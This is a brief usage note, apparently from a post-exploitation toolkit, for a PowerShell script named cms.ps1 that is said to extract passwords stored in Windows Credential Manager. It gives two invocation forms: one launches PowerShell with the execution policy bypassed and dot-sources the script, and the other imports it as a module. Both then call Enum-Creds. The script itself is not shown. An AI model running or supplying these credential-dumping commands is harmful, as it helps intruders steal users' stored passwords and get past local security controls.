It will extract the password which is stored in Credentials Manager on Windows 

```powershell
powershell -ep bypass
. .\cms.ps1  
Enum-Creds
```
OR

```powershell
powershell import-module C:\unknown\LPE\cms.ps1 ; Enum-Creds
```
